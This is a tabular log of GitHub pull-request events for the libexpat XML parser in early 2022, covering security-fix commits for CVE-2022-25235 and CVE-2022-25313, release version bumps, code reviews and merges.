562,RenameTitle,2022-02-16 01:01:28,hartwork,unfork_merge,,"{""rename"": {""from"": ""[CVE-2022-25236] lib: Protect against malformed encoding (e.g. malformed UTF-8)"", ""to"": ""[CVE-2022-25235] lib: Protect against malformed encoding (e.g. malformed UTF-8)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6079232937""}"
562,HeadRefForcePushed,2022-02-16 01:04:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6079251015"", ""commit_url"": null}"
562,Revise,2022-02-18 17:02:19,hartwork,unfork_merge,lib: Add missing validation of encoding (CVE-2022-25235),"{""sha"": ""3f0a0cb644438d4d8e3294cd0b1245d0edb0c6c6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-08T03:32:20Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T17:02:19Z""}}"
562,Revise,2022-02-18 17:02:19,hartwork,unfork_merge,lib: Add comments to BT_LEAD* cases where encoding has already been validated,"{""sha"": ""c85a3025e7a1be086dc34e7559fbc543914d047f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-09T00:00:38Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T17:02:19Z""}}"
562,Revise,2022-02-18 17:02:19,hartwork,unfork_merge,tests: Cover missing validation of encoding (CVE-2022-25235),"{""sha"": ""6a5510bc6b7efe743356296724e0b38300f05379"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-08T03:06:21Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T17:02:19Z""}}"
562,Revise,2022-02-18 17:02:19,hartwork,unfork_merge,lib: Drop unused macro UTF8_GET_NAMING,"{""sha"": ""ee2a5b50e7d1940ba8745715b62ceb9efd3a96da"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-08T16:37:14Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T17:02:19Z""}}"
562,Revise,2022-02-18 17:04:27,hartwork,unfork_merge,Changes: Document CVE-2022-25235,"{""sha"": ""c16300f0bc4318f31f9e27eb2702ddbffe086fea"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-08T16:18:00Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T17:04:27Z""}}"
562,HeadRefForcePushed,2022-02-18 17:05:27,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100901459"", ""commit_url"": null}"
562,MergePR,2022-02-18 19:12:32,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6101818355"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/306b72134f157bbfd1637b20a22cabf4acfa136a""}"
562,DeleteBranch,2022-02-18 19:13:57,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6101827945"", ""commit_url"": null}"
562,CrossReferenced,2022-02-22 09:20:55,Tzoockee,unfork_merge,[request] <EXPAT>/<2.4.6>,"{""reference"": {""url"": ""https://api.github.com/repos/conan-io/conan-center-index/issues/9471"", ""is_pull_request"": false}}"
563,SubmitCommit,2022-02-15 20:23:25,hartwork,unfork_merge,Extend .mailmap,"{""sha"": ""68ed0d7e6363a1a77f724bca1f5df7f5014872c1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-15T20:17:43Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-15T20:23:25Z""}}"
563,SubmitCommit,2022-02-15 20:23:29,hartwork,unfork_merge,Sync file headers,"{""sha"": ""317c91776a20a9e1d9ba32973c23f236a99b9662"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-15T20:19:35Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-15T20:23:29Z""}}"
563,Labeled,2022-02-15 20:26:25,hartwork,unfork_merge,enhancement,
563,OpenPR,2022-02-15 20:26:25,hartwork,unfork_merge,,
563,MergePR,2022-02-15 21:43:53,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6078434999"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f1a444ef64680ebd4ff89091a2c388cd046ece2d""}"
563,DeleteBranch,2022-02-15 21:46:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6078447329"", ""commit_url"": null}"
564,SubmitCommit,2022-02-18 19:14:29,hartwork,unfork_merge,Changes: Document #558 #559 #560,"{""sha"": ""e2d43320ce28949dcb91841c3e16f2b6fb4a2271"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-17T00:28:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T19:14:29Z""}}"
564,SubmitCommit,2022-02-18 19:14:29,hartwork,unfork_merge,"Bump version info from 9:4:8 to 9:5:8

See https://verbump.de/ for what these numbers do","{""sha"": ""748c618f7222f130b2ba39c3473460bbf6894b3a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T18:01:25Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T19:14:29Z""}}"
564,SubmitCommit,2022-02-18 19:17:16,hartwork,unfork_merge,Bump version to 2.4.5,"{""sha"": ""fa379d65dd152b215819249e4eb550b5202e6ebc"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T18:01:54Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T19:17:16Z""}}"
564,SubmitCommit,2022-02-18 19:17:16,hartwork,unfork_merge,Sync file headers,"{""sha"": ""fdbd69b12c60cd52a00db36288245a675aac4db3"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T18:06:24Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T19:17:16Z""}}"
564,SubmitCommit,2022-02-18 19:17:17,hartwork,unfork_merge,Set expected release date for 2.4.5,"{""sha"": ""bacd815ed0ce37225f894f75836e0dad8d5204c3"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T18:07:55Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-18T19:17:17Z""}}"
564,Labeled,2022-02-18 19:21:18,hartwork,unfork_merge,security,
564,Labeled,2022-02-18 19:21:18,hartwork,unfork_merge,releasing,
564,OpenPR,2022-02-18 19:21:18,hartwork,unfork_merge,,
564,MergePR,2022-02-18 22:39:30,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6103028959"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/97a4840578693a346e79302909b67d97492e1880""}"
564,DeleteBranch,2022-02-18 22:41:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6103037250"", ""commit_url"": null}"
566,SubmitCommit,2022-02-20 11:55:46,ferivoz,fork_merge,"Fix build_model regression.

The iterative approach in build_model failed to fill children arrays
correctly. A preorder traversal is not required and turned out to be the
culprit. Use an easier algorithm:

Add nodes from scaffold tree starting at index 0 (root) to the target
array whenever children are encountered. This ensures that children
are adjacent to each other. This complies with the recursive version.

Store only the scaffold index in numchildren field to prevent a direct
processing of these children, which would require a recursive solution.
This allows the algorithm to iterate through the target array from start
to end without jumping back and forth, converting on the fly.

Co-authored-by: Sebastian Pipping <sebastian@pipping.org>","{""sha"": ""b12f34fe32821a69dc12ff9a021daca0856de238"", ""author"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-19T23:59:25Z""}, ""committer"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-20T11:55:46Z""}}"
566,SubmitCommit,2022-02-20 11:55:49,hartwork,fork_merge,tests: Protect against nested element declaration model regressions,"{""sha"": ""154e565f6ef329c9ec97e6534c411ddde0b320c8"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T02:26:57Z""}, ""committer"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-20T11:55:49Z""}}"
566,SubmitCommit,2022-02-20 11:55:54,hartwork,fork_merge,Changes: Document regression from CVE-2022-25313 fix,"{""sha"": ""2722201a5baffbbe5c4942a42dd1fa21b8d22ccc"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T03:25:52Z""}, ""committer"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-20T11:55:54Z""}}"
566,OpenPR,2022-02-20 11:56:54,ferivoz,fork_merge,,
566,Labeled,2022-02-20 14:57:41,hartwork,fork_merge,bug,
566,MergePR,2022-02-20 14:57:54,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6107352775"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9288cd5474bf6d3d0c037c247f9581d5e4df5097""}"
566,Referenced,2022-02-20 15:12:15,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6107371922"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/49abcfba57808b02809b8066cca6d66b55f23dbf""}"
566,RenameTitle,2022-03-05 00:19:53,hartwork,fork_merge,,"{""rename"": {""from"": ""Fix build_model regression"", ""to"": ""Fix build_model regression (from fix to CVE-2022-25313)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6188382228""}"
566,Referenced,2022-03-09 17:31:07,halstead,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6211783732"", ""commit_url"": ""https://api.github.com/repos/openembedded/openembedded-core/commits/8105700b1d6d23c87332f453bdc7379999bb4b03""}"
566,Referenced,2022-03-09 17:46:28,kraj,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6211878891"", ""commit_url"": ""https://api.github.com/repos/YoeDistro/poky-old/commits/e173db21d0899a5cb185f01f8aaf92156d3e910c""}"
566,Referenced,2022-03-12 06:00:30,jpuhlman,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6229255028"", ""commit_url"": ""https://api.github.com/repos/MontaVista-OpenSourceTechnology/poky/commits/b1e1f77b469df89c5af6190add6c50d4dc275eb2""}"
568,SubmitCommit,2022-02-20 15:09:22,hartwork,unfork_merge,Changes: Finalize entry on #566,"{""sha"": ""49abcfba57808b02809b8066cca6d66b55f23dbf"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:02:20Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:09:22Z""}}"
568,SubmitCommit,2022-02-20 15:09:26,hartwork,unfork_merge,"Bump version info from 9:5:8 to 9:6:8

See https://verbump.de/ for what these numbers do","{""sha"": ""45732df416c157fe2994824ec52ad6ea6d00c924"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:04:35Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:09:26Z""}}"
568,SubmitCommit,2022-02-20 15:09:26,hartwork,unfork_merge,Bump version to 2.4.6,"{""sha"": ""28f74546b4cea31c8c690ced8fc215307052c9b8"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:05:01Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:09:26Z""}}"
568,SubmitCommit,2022-02-20 15:09:26,hartwork,unfork_merge,Set expected release date for 2.4.6,"{""sha"": ""400e6955ff743bd4a6d98715cc7254a5814c4b2e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:07:56Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-20T15:09:26Z""}}"
568,Labeled,2022-02-20 15:20:26,hartwork,unfork_merge,releasing,
568,OpenPR,2022-02-20 15:20:26,hartwork,unfork_merge,,
568,MergePR,2022-02-20 17:01:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6107511089"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/65a21f2b2a306d29b44e70264aca948aa0454219""}"
568,DeleteBranch,2022-02-20 17:02:10,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6107511884"", ""commit_url"": null}"
570,OpenPR,2022-02-23 21:29:10,petitlapin,fork_merge,,
570,IssueComment,2022-02-23 21:29:46,petitlapin,fork_merge,"Hi,
feel free to rewrite the commit message if needed.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1049233372"", ""author_association"": ""NONE""}"
570,ReviewRejected,2022-02-23 21:47:30,hartwork,fork_merge,"Hi @petitlapin I like this direction, thanks for providing a pull request! :+1: Please see comments on details below.","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/570#pullrequestreview-891723775""}"
570,HeadRefForcePushed,2022-02-23 21:57:42,petitlapin,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6128236105"", ""commit_url"": null}"
570,ReviewComment,2022-02-23 22:06:00,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/570#pullrequestreview-891752799""}"
570,ReviewComment,2022-02-23 22:17:10,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/570#pullrequestreview-891763054""}"
570,HeadRefForcePushed,2022-02-24 07:11:20,petitlapin,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6130104514"", ""commit_url"": null}"
570,ReviewRejected,2022-02-24 15:27:14,hartwork,fork_merge,"@petitlapin I like your new changes, we're getting close. Thank you! :+1: Two comments below:","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/570#pullrequestreview-892600197""}"
570,HeadRefForcePushed,2022-02-24 20:15:20,petitlapin,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6134774660"", ""commit_url"": null}"
570,ReviewRejected,2022-02-24 21:23:23,hartwork,fork_merge,"> No problem at all. It is better to do it good first than doing a botched job :)

@petitlapin okay nice! There is some chance this is the last two tiny things:
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/570#pullrequestreview-893004897""}"
570,Revise,2022-02-24 21:26:40,petitlapin,fork_merge,"CMake/Windows: store Expat version in the dll

Fixes #555

Tested with msvc2019 and mingw8.1","{""sha"": ""f29483773346105da81f73878b5d0832b2d541b8"", ""author"": {""name"": ""Johnny Jazeix"", ""email"": ""jazeix@gmail.com"", ""date"": ""2022-02-23T21:17:35Z""}, ""committer"": {""name"": ""Johnny Jazeix"", ""email"": ""jazeix@gmail.com"", ""date"": ""2022-02-24T21:26:40Z""}}"
570,HeadRefForcePushed,2022-02-24 21:26:46,petitlapin,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6135192326"", ""commit_url"": null}"
570,IssueComment,2022-02-24 21:29:29,petitlapin,fork_merge,"> > No problem at all. It is better to do it good first than doing a botched job :)
> 
> @petitlapin okay nice! There is some chance this is the last two tiny things:

Sorry, I was too quick on it :)","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1050283163"", ""author_association"": ""NONE""}"
570,ReviewApproved,2022-02-24 21:30:58,hartwork,fork_merge,@petitlapin looks perfect to me now :+1: :+1: — let's see if the CI gives their final blessing,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/570#pullrequestreview-893021279""}"
570,Labeled,2022-02-24 22:07:45,hartwork,fork_merge,enhancement,
570,MergePR,2022-02-24 22:09:10,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6135391257"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/6aa6a82d2407ca7ba221299d378cb3803d2cf519""}"
570,IssueCommentSupplement,2022-02-24 22:09:50,hartwork,fork_merge,"@petitlapin CI loves it, very nice, merged, thanks for your contribution to Expat! :+1: :pray: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1050313230"", ""author_association"": ""MEMBER""}"
570,Labeled,2022-02-24 22:10:03,hartwork,fork_merge,windows,
570,RenameTitle,2022-02-24 22:10:48,hartwork,fork_merge,,"{""rename"": {""from"": ""CMake/Windows: store Expat version in the dll"", ""to"": ""CMake/Windows: Store Expat version in the DLL""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6135398888""}"
570,DeleteBranch,2022-02-24 22:12:55,petitlapin,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6135409985"", ""commit_url"": null}"
570,Referenced,2022-03-04 18:13:20,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186875781"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/3b1a593626213be258c12c5a2cb9a5890166d1f0""}"
570,Referenced,2022-03-04 18:16:25,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186891441"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/99eddcd2bbc69e8ba710a6da614326710191e816""}"
570,CrossReferenced,2022-03-04 20:39:09,hartwork,fork_merge,"Fix windows installer (related to #555, follow-up to #570)","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/581"", ""is_pull_request"": true}}"
570,Referenced,2022-03-04 21:23:08,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6187796605"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/27d5b8ba1771f916d9cfea2aac6bdac72071dc66""}"
571,SubmitCommit,2022-02-23 21:58:36,hartwork,unfork_merge,tests: Resolve use of macros NAN and INFINITY for GNU G++ 4.8.2,"{""sha"": ""f6f5d9bb4cc05fb9544ec92e0c3e6a44013cbc1f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-23T18:17:51Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-23T21:58:36Z""}}"
571,Labeled,2022-02-23 21:59:38,hartwork,unfork_merge,bug,
571,OpenPR,2022-02-23 21:59:38,hartwork,unfork_merge,,
571,MergePR,2022-02-23 23:34:52,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6128680926"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ce08faf294020983f72fce1afca20d8a7a67aba3""}"
571,DeleteBranch,2022-02-24 16:21:28,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6133402362"", ""commit_url"": null}"
573,SubmitCommit,2022-02-26 19:26:07,noloader,fork_merge,"Update documentation on use of XML_POOR_ENTOPY on SOlaris
Also see GH #172 and https://docs.oracle.com/cd/E88353_01/html/E37851/urandom-4d.html","{""sha"": ""5d95dd938b0794a16e1bd14a3aa47d3b0cfbcbea"", ""author"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T19:26:07Z""}, ""committer"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T19:26:07Z""}}"
573,OpenPR,2022-02-26 19:28:34,noloader,fork_merge,,
573,ReviewRejected,2022-02-26 19:46:36,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/573#pullrequestreview-894435514""}"
573,Revise,2022-02-26 19:49:42,noloader,fork_merge,"Update documentation on use of XML_POOR_ENTOPY on Solaris
Also see GH #172 and https://docs.oracle.com/cd/E88353_01/html/E37851/urandom-4d.html","{""sha"": ""e28dce301dd4644e44944d0448226d1a3c91e9cf"", ""author"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T19:49:42Z""}, ""committer"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T19:49:42Z""}}"
573,ReviewRejected,2022-02-26 19:55:52,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/573#pullrequestreview-894436152""}"
573,Revise,2022-02-26 19:59:02,noloader,fork_merge,"Update documentation on use of XML_POOR_ENTOPY on Solaris
Also see GH #172 and https://docs.oracle.com/cd/E88353_01/html/E37851/urandom-4d.html","{""sha"": ""f2e15cfa3516e069956219c86caf72a1b6b10a20"", ""author"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T19:59:02Z""}, ""committer"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T19:59:02Z""}}"
573,ReviewRejected,2022-02-26 20:07:39,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/573#pullrequestreview-894436654""}"
573,Revise,2022-02-26 20:53:57,noloader,fork_merge,"Update documentation on use of XML_POOR_ENTOPY on Solaris
Also see GH #172 and https://docs.oracle.com/cd/E88353_01/html/E37851/urandom-4d.html","{""sha"": ""0b45a6975d3838f090c1ffc919f2803d45a3ff20"", ""author"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T20:53:57Z""}, ""committer"": {""name"": ""Jeffrey Walton"", ""email"": ""noloader@gmail.com"", ""date"": ""2022-02-26T20:53:57Z""}}"
573,ReviewApproved,2022-02-26 20:59:48,hartwork,fork_merge,Thanks! :+1: ,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/573#pullrequestreview-894439941""}"
573,MergePR,2022-02-26 21:00:17,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6147044163"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/8c4b3aa16f8b7da457477878294e62b0c7e265cb""}"
573,Labeled,2022-03-04 17:51:17,hartwork,fork_merge,documentation,
573,Labeled,2022-03-04 17:51:17,hartwork,fork_merge,enhancement,
573,Referenced,2022-03-04 18:13:20,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186875793"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/3b1a593626213be258c12c5a2cb9a5890166d1f0""}"
573,Referenced,2022-03-04 18:16:26,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186891448"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/99eddcd2bbc69e8ba710a6da614326710191e816""}"
574,SubmitCommit,2022-02-27 01:42:54,hartwork,unfork_merge,lib: Make hardcoded namespace URIs easier to find,"{""sha"": ""92527164e7de598b181c99bcf7dd2ae8aac4e940"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-27T01:39:58Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-27T01:42:54Z""}}"
574,Labeled,2022-02-27 01:44:32,hartwork,unfork_merge,enhancement,
574,OpenPR,2022-02-27 01:44:32,hartwork,unfork_merge,,
574,MergePR,2022-02-27 02:49:16,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6148359673"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/866a8617e432f682d10dc83d052b97770a14bbe7""}"
574,DeleteBranch,2022-02-27 15:23:10,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6150481967"", ""commit_url"": null}"
574,Referenced,2022-03-04 18:13:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186875804"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/3b1a593626213be258c12c5a2cb9a5890166d1f0""}"
574,Referenced,2022-03-04 18:16:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186891462"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/99eddcd2bbc69e8ba710a6da614326710191e816""}"
576,SubmitCommit,2022-03-03 17:26:52,jonringer,fork_close,Add Nix CI to build downstream packages,"{""sha"": ""b7f20ae94171922963a1eea522168625cbd118ae"", ""author"": {""name"": ""Jonathan Ringer"", ""email"": ""jonringer117@gmail.com"", ""date"": ""2022-03-03T17:24:31Z""}, ""committer"": {""name"": ""Jonathan Ringer"", ""email"": ""jonringer117@gmail.com"", ""date"": ""2022-03-03T17:26:52Z""}}"
576,OpenPR,2022-03-03 17:28:15,jonringer,fork_close,,
576,IssueComment,2022-03-03 17:36:43,hartwork,fork_close,"@jonringer something like that was offered to me at https://github.com/NixOS/nixpkgs/pull/160826#issuecomment-1046294266 and I respectfully declined at https://github.com/NixOS/nixpkgs/pull/160826#issuecomment-1046294654 . NixOS has no place in Expat CI, sorry. I'm closing this pull request.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1058307858"", ""author_association"": ""MEMBER""}"
576,ClosePR,2022-03-03 17:36:44,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6179887891"", ""commit_url"": null}"
576,IssueCommentSupplement,2022-03-03 17:42:52,jonringer,fork_close,"> @jonringer something like that was offered to me at [NixOS/nixpkgs#160826 (comment)](https://github.com/NixOS/nixpkgs/pull/160826#issuecomment-1046294266) and I respectfully declined at [NixOS/nixpkgs#160826 (comment)](https://github.com/NixOS/nixpkgs/pull/160826#issuecomment-1046294654) . NixOS has no place in Expat CI, sorry. I'm closing this pull request.

Yea, it would only be a win if you had infinite compute. Understood.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1058313190"", ""author_association"": ""NONE""}"
576,DeleteBranch,2022-03-03 17:42:56,jonringer,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6179926406"", ""commit_url"": null}"
577,OpenPR,2022-03-03 19:50:51,hartwork,unfork_merge,,
577,Labeled,2022-03-03 19:51:20,hartwork,unfork_merge,bug,
577,CrossReferenced,2022-03-03 20:10:19,hartwork,unfork_merge,[DRAFT] Switch namespace separator from colon to pipe,"{""reference"": {""url"": ""https://api.github.com/repos/hartwork/rnv/issues/3"", ""is_pull_request"": true}}"
577,CrossReferenced,2022-03-03 20:17:57,hartwork,unfork_merge,build fails due to `rnv` out of memory,"{""reference"": {""url"": ""https://api.github.com/repos/TEIC/TEI/issues/2239"", ""is_pull_request"": false}}"
577,CrossReferenced,2022-03-03 20:19:10,hartwork,unfork_merge,expat: 2.4.5 -> 2.4.6,"{""reference"": {""url"": ""https://api.github.com/repos/NixOS/nixpkgs/issues/161090"", ""is_pull_request"": true}}"
577,CrossReferenced,2022-03-03 20:25:52,hartwork,unfork_merge,Release Expat 2.4.7,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/578"", ""is_pull_request"": false}}"
577,Referenced,2022-03-03 21:13:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6181036485"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9fa74fc2ae0ef2ad7e6e19150ad5003d729e0053""}"
577,HeadRefForcePushed,2022-03-03 21:13:07,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6181036517"", ""commit_url"": null}"
577,ReviewComment,2022-03-04 12:01:53,ferivoz,unfork_merge,,"{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/577#pullrequestreview-900143229""}"
